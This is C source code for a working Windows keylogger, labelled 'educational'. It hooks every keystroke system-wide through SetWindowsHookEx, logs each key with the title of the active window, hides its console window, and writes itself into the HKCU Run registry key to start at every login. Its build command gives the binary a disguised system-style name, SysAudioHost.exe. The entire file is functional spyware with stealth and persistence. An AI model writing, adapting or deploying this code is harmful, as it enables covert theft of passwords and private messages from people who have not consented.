/*
 * keylogger_demo.c - Educational Windows Keylogger
 * Coded by Egyan
 *
 * Features:
 *   - Low-level keyboard hook via SetWindowsHookEx (WH_KEYBOARD_LL)
 *   - Active window title capture (which app is being typed in)
 *   - Timestamps on every window switch
 *   - Daily log rotation (keylog_YYYY-MM-DD.txt)
 *   - Stealth mode (hidden console window)
 *   - Registry persistence (runs on startup)
 *
 * Build:
 *   gcc SysAudioHost.c -o SysAudioHost.exe -luser32 -ladvapi32 -mwindows
 *
 * The -mwindows flag is critical — it prevents the console window
 * from appearing when the binary is launched.
 *
 * FOR EDUCATIONAL USE ONLY. Only run on machines you own or
 * have explicit written permission to test on.
 */

#define AUTHOR  "Egyan"
#define BINARY  "keylogger_demo.exe"

#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <string.h>

/* ── Configuration ─────────────────────────────────────── */
#define LOG_DIR          "C:\\Users\\Public\\logs\\"   /* Log output folder   */
#define REGISTRY_KEY     "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REGISTRY_NAME    "keylogger_demo"              /* Registry value name */
#define MAX_PATH_LEN     512
#define MAX_TITLE_LEN    256

/* ── Globals ────────────────────────────────────────────── */
static HHOOK  g_hook       = NULL;   /* Handle to the keyboard hook           */
static FILE  *g_logfile    = NULL;   /* Current open log file                 */
static char   g_log_date[16] = {0};  /* Tracks current log date (YYYY-MM-DD)  */
static char   g_last_window[MAX_TITLE_LEN] = {0}; /* Last active window title */

/* ── Forward declarations ───────────────────────────────── */
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void     open_log_for_today(void);
void     write_window_header(const char *title);
void     write_key(DWORD vkCode, BOOL shift, BOOL caps);
void     install_persistence(void);
const char *vk_to_string(DWORD vk, BOOL shift, BOOL caps);


/* ════════════════════════════════════════════════════════
 *  ENTRY POINT
 * ════════════════════════════════════════════════════════ */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
                   LPSTR lpCmdLine, int nCmdShow)
{
    /* 1. Create log directory if it doesn't exist */
    CreateDirectoryA(LOG_DIR, NULL);

    /* 2. Open today's log file */
    open_log_for_today();

    /* 3. Add to registry for persistence */
    install_persistence();

    /* 4. Install the low-level keyboard hook.
     *    WH_KEYBOARD_LL intercepts keystrokes system-wide,
     *    even when this process is not in focus.
     *    NULL as the module handle + 0 as thread ID = global hook. */
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!g_hook) {
        /* Hook failed — quietly exit */
        if (g_logfile) fclose(g_logfile);
        return 1;
    }

    /* 5. Message pump — required to keep the hook alive.
     *    Windows delivers hook callbacks via the message queue,
     *    so we need GetMessage/TranslateMessage/DispatchMessage
     *    running continuously. */
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    /* 6. Cleanup */
    UnhookWindowsHookEx(g_hook);
    if (g_logfile) fclose(g_logfile);

    return 0;
}


/* ════════════════════════════════════════════════════════
 *  KEYBOARD HOOK CALLBACK
 *  Called by Windows for every key event system-wide.
 *  nCode >= 0 means we should process the event.
 *  wParam tells us if it's keydown or keyup.
 *  lParam points to a KBDLLHOOKSTRUCT with key details.
 * ════════════════════════════════════════════════════════ */
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {

        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = kb->vkCode;

        /* ── Rotate log file if date changed ── */
        open_log_for_today();

        /* ── Detect active window change ── */
        char current_title[MAX_TITLE_LEN] = {0};
        HWND fg = GetForegroundWindow();
        if (fg) {
            GetWindowTextA(fg, current_title, MAX_TITLE_LEN);
        }
        if (strcmp(current_title, g_last_window) != 0) {
            strncpy(g_last_window, current_title, MAX_TITLE_LEN - 1);
            write_window_header(current_title);
        }

        /* ── Get shift/caps state for correct character mapping ── */
        BOOL shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        BOOL caps  = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

        /* ── Write the key to log ── */
        write_key(vkCode, shift, caps);
    }

    /* Always pass to next hook in chain — don't swallow events */
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}


/* ════════════════════════════════════════════════════════
 *  LOG FILE MANAGEMENT
 *  Opens a new log file per day: keylog_2025-01-15.txt
 *  Called on every keystroke to handle midnight rotation.
 * ════════════════════════════════════════════════════════ */
void open_log_for_today(void)
{
    time_t now = time(NULL);
    struct tm *t = localtime(&now);

    char today[16];
    snprintf(today, sizeof(today), "%04d-%02d-%02d",
             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday);

    /* Already on today's file — nothing to do */
    if (strcmp(today, g_log_date) == 0 && g_logfile != NULL) return;

    /* Close previous file if open */
    if (g_logfile) {
        fprintf(g_logfile, "\n\n[Session ended: %s]\n", today);
        fclose(g_logfile);
    }

    /* Build new file path */
    char path[MAX_PATH_LEN];
    snprintf(path, sizeof(path), "%skeylog_%s.txt", LOG_DIR, today);

    /* Open in append mode — survives restarts without losing data */
    g_logfile = fopen(path, "a");
    if (g_logfile) {
        strncpy(g_log_date, today, sizeof(g_log_date) - 1);

        /* Write session start header */
        char timebuf[64];
        strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", t);
        fprintf(g_logfile, "\n\n════════════════════════════════\n");
        fprintf(g_logfile, "Session started: %s\n", timebuf);
        fprintf(g_logfile, "════════════════════════════════\n\n");
        fflush(g_logfile);
    }
}


/* ════════════════════════════════════════════════════════
 *  WINDOW HEADER
 *  Written whenever the active window changes.
 *  Gives context to what was being typed where.
 * ════════════════════════════════════════════════════════ */
void write_window_header(const char *title)
{
    if (!g_logfile) return;

    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    char timebuf[32];
    strftime(timebuf, sizeof(timebuf), "%H:%M:%S", t);

    fprintf(g_logfile, "\n\n[%s] ── Window: %s ──\n",
            timebuf,
            (title && title[0]) ? title : "(unknown)");
    fflush(g_logfile);
}


/* ════════════════════════════════════════════════════════
 *  KEY WRITER
 *  Converts virtual key code to readable string and logs it.
 *  Special keys get labels like [ENTER], [BACKSPACE] etc.
 *  Regular characters are written directly.
 * ════════════════════════════════════════════════════════ */
void write_key(DWORD vkCode, BOOL shift, BOOL caps)
{
    if (!g_logfile) return;

    const char *key = vk_to_string(vkCode, shift, caps);
    if (key) {
        fputs(key, g_logfile);
        fflush(g_logfile);
    }
}


/* ════════════════════════════════════════════════════════
 *  VIRTUAL KEY → STRING MAPPING
 *  Handles:
 *    - Printable characters (A-Z, 0-9, symbols)
 *    - Shift modifier for uppercase / symbols
 *    - CapsLock state
 *    - Special keys labeled in [BRACKETS]
 * ════════════════════════════════════════════════════════ */
const char *vk_to_string(DWORD vk, BOOL shift, BOOL caps)
{
    static char buf[8];

    /* Special keys */
    switch (vk) {
        case VK_RETURN:    return "[ENTER]\n";
        case VK_BACK:      return "[BACKSPACE]";
        case VK_TAB:       return "[TAB]";
        case VK_SPACE:     return " ";
        case VK_ESCAPE:    return "[ESC]";
        case VK_DELETE:    return "[DEL]";
        case VK_LEFT:      return "[LEFT]";
        case VK_RIGHT:     return "[RIGHT]";
        case VK_UP:        return "[UP]";
        case VK_DOWN:      return "[DOWN]";
        case VK_HOME:      return "[HOME]";
        case VK_END:       return "[END]";
        case VK_PRIOR:     return "[PGUP]";
        case VK_NEXT:      return "[PGDN]";
        case VK_CAPITAL:   return "[CAPS]";
        case VK_LSHIFT:
        case VK_RSHIFT:    return "";   /* Don't log bare shift press */
        case VK_LCONTROL:
        case VK_RCONTROL:  return "[CTRL]";
        case VK_LMENU:
        case VK_RMENU:     return "[ALT]";
        case VK_LWIN:
        case VK_RWIN:      return "[WIN]";
        case VK_F1:        return "[F1]";
        case VK_F2:        return "[F2]";
        case VK_F3:        return "[F3]";
        case VK_F4:        return "[F4]";
        case VK_F5:        return "[F5]";
        case VK_F6:        return "[F6]";
        case VK_F7:        return "[F7]";
        case VK_F8:        return "[F8]";
        case VK_F9:        return "[F9]";
        case VK_F10:       return "[F10]";
        case VK_F11:       return "[F11]";
        case VK_F12:       return "[F12]";
        case VK_SNAPSHOT:  return "[PRTSC]";
    }

    /* Alpha keys A-Z */
    if (vk >= 'A' && vk <= 'Z') {
        /* CapsLock XOR Shift determines case */
        BOOL upper = (caps ^ shift);
        buf[0] = upper ? (char)vk : (char)(vk + 32);
        buf[1] = '\0';
        return buf;
    }

    /* Number row 0-9 with shift symbols */
    if (vk >= '0' && vk <= '9') {
        if (!shift) {
            buf[0] = (char)vk;
            buf[1] = '\0';
            return buf;
        }
        /* Shift + number row symbols (standard US layout) */
        const char shifted[] = ")!@#$%^&*(";
        buf[0] = shifted[vk - '0'];
        buf[1] = '\0';
        return buf;
    }

    /* Common symbols */
    switch (vk) {
        case VK_OEM_MINUS:   return shift ? "_" : "-";
        case VK_OEM_PLUS:    return shift ? "+" : "=";
        case VK_OEM_4:       return shift ? "{" : "[";
        case VK_OEM_6:       return shift ? "}" : "]";
        case VK_OEM_5:       return shift ? "|" : "\\";
        case VK_OEM_1:       return shift ? ":" : ";";
        case VK_OEM_7:       return shift ? "\"" : "'";
        case VK_OEM_COMMA:   return shift ? "<" : ",";
        case VK_OEM_PERIOD:  return shift ? ">" : ".";
        case VK_OEM_2:       return shift ? "?" : "/";
        case VK_OEM_3:       return shift ? "~" : "`";
    }

    /* Numpad */
    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) {
        buf[0] = '0' + (char)(vk - VK_NUMPAD0);
        buf[1] = '\0';
        return buf;
    }

    /* Ignore everything else silently */
    return NULL;
}


/* ════════════════════════════════════════════════════════
 *  REGISTRY PERSISTENCE
 *  Writes the full path of this executable into:
 *  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 *  under a disguised name so it launches on every login.
 *
 *  Uses HKCU (Current User) — doesn't need admin rights.
 *  HKLM would be system-wide but requires elevation.
 * ════════════════════════════════════════════════════════ */
void install_persistence(void)
{
    HKEY hKey;
    char exe_path[MAX_PATH_LEN] = {0};

    /* Get full path of this running executable */
    GetModuleFileNameA(NULL, exe_path, MAX_PATH_LEN);

    /* Open the Run registry key for writing */
    LONG result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        REGISTRY_KEY,
        0,
        KEY_SET_VALUE,
        &hKey
    );

    if (result != ERROR_SUCCESS) return;

    /* Write the value — next login this exe will auto-start */
    RegSetValueExA(
        hKey,
        REGISTRY_NAME,          /* Value name (disguised) */
        0,
        REG_SZ,                 /* String type */
        (BYTE *)exe_path,
        (DWORD)(strlen(exe_path) + 1)
    );

    RegCloseKey(hKey);
}
